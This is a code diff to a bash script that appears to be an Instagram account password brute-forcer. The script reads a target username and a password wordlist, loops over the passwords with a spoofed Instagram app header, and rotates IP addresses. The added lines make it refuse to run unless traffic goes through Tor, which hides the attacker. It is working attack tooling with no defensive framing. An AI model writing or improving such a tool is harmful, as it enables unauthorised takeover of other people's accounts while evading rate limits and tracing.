@@ -24,6 +24,17 @@ checkroot
 read -p $'\e[1;92mUsername account: \e[0m' user
 read -p $'\e[1;92mPassword List: \e[0m' wl_pass
 
+checktor() {
+
+check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
+
+if [[ "$check" -gt 0 ]]; then
+printf "\e[1;91mPlease, start TOR!\n\e[0m"
+exit 1
+fi
+
+}
+
 
 function changeip() {
 
@@ -45,6 +56,8 @@ var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 #echo $var2
 
 function bruteforcer() {
+
+checktor
 for pass in $(cat $wl_pass); do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
